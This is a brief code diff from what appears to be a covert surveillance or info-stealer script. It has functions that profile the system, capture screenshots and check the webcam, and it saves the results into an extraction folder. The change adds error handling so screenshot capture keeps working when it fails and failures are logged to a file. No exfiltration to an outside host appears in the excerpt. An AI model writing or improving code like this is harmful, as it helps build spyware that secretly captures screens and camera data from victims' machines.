@@ -65,8 +65,13 @@ def profile_system():
 
 # === SCREENSHOT + WEBCAM ===
 def take_screenshot():
-    img = ImageGrab.grab()
-    img.save(os.path.join(EXTRACT_FOLDER, "screenshot.png"))
+    try:
+        img = ImageGrab.grab()
+        img.save(os.path.join(EXTRACT_FOLDER, "screenshot.png"))
+    except Exception as e:
+        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
+            f.write(f"[!] Screenshot failed during run(): {e}")
+
 
 def check_webcam():
     try:
